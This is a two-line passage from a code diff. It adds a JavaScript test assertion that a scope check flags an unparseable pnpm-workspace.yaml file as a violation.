+  assert.deepEqual(scope.violations, ["pnpm-workspace.yaml (unparseable)"]);
 });
